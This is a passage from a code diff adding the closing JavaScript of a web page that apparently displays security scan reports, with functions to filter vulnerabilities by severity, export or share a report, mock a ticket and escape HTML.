+  const lowerQuery = query.toLowerCase();
+  
+  items.forEach(item => {
+    const text = item.textContent.toLowerCase();
+    const matchesSearch = text.includes(lowerQuery);
+    const matchesFilter = currentFilter === 'all' || item.dataset.severity === currentFilter;
+    
+    if (matchesSearch && matchesFilter) {
+      item.style.display = 'block';
+    } else {
+      item.style.display = 'none';
+    }
+  });
+}
+
+function toggleChart() {
+  const container = document.getElementById('chartContainer');
+  container.style.display = container.style.display === 'none' ? 'block' : 'none';
+}
+
+function exportReport() {
+  const tool = TOOL_DATA[currentTool];
+  const report = {
+    tool: tool.name,
+    timestamp: new Date().toISOString(),
+    summary: tool.summary,
+    vulnerabilities: tool.vulns
+  };
+  
+  const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `${currentTool}_report_${Date.now()}.json`;
+  a.click();
+  setTimeout(() => URL.revokeObjectURL(url), 1000);
+}
+
+function shareReport() {
+  const shareUrl = window.location.href + '?tool=' + currentTool;
+  if (navigator.share) {
+    navigator.share({
+      title: `${TOOL_DATA[currentTool].name} Security Report`,
+      text: 'Check out this security scan report',
+      url: shareUrl
+    });
+  } else {
+    navigator.clipboard.writeText(shareUrl);
+    alert('Report URL copied to clipboard!');
+  }
+}
+
+function createTicket() {
+  const tool = TOOL_DATA[currentTool];
+  const criticalCount = tool.summary.critical;
+  const highCount = tool.summary.high;
+  
+  alert(`Creating ticket with:\n\n` +
+        `Tool: ${tool.name}\n` +
+        `Critical: ${criticalCount}\n` +
+        `High: ${highCount}\n\n` +
+        `This would integrate with your ticketing system (Jira, GitHub Issues, etc.)`);
+}
+
+function escapeHtml(text) {
+  const map = {
+    '&': '&amp;',
+    '<': '&lt;',
+    '>': '&gt;',
+    '"': '&quot;',
+    "'": '&#039;'
+  };
+  return text.replace(/[&<>"']/g, m => map[m]);
+}
+
+// Initialize page
+initPage();
+
+// Handle window resize for chart
+window.addEventListener('resize', () => {
+  const tool = TOOL_DATA[currentTool];
+  drawChart(tool.summary);
+});
+</script>
+
+</body>
+</html>
+
+
